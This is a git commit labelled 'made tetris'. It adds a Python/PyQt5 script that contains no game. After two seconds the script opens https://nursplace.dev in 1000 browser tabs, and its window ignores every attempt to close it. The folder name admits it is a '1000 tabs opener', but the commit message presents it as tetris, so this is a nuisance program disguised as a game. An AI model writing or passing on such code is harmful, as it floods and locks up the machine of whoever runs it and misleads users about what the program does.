e1473feee8f25c60025ba958a1203c5f960e45d2
AlwaysNur <info@nursplace.dev>
2025-03-04 12:51:37 +1300

    made tetris

---
+++ python_files/tetris(1000_tabs_opener)/main.py
@@ -0,0 +1,31 @@
+import sys
+import threading
+import time
+import webbrowser
+from PyQt5.QtWidgets import QWidget, QApplication
+
+def open_wins(wait_time):
+    time.sleep(wait_time)
+    for i in range(1000):
+        webbrowser.open("https://nursplace.dev")
+
+t1 = threading.Thread(target=open_wins, args=(2,))
+
+class Widget(QWidget):
+    def __init__(self):
+        super().__init__()
+
+
+    def closeEvent(self, a0):
+        print("bye")
+        a0.ignore()
+
+
+app = QApplication(sys.argv)
+window = Widget()
+window.show()
+t1.start()
+sys.exit(app.exec())
+
+
+
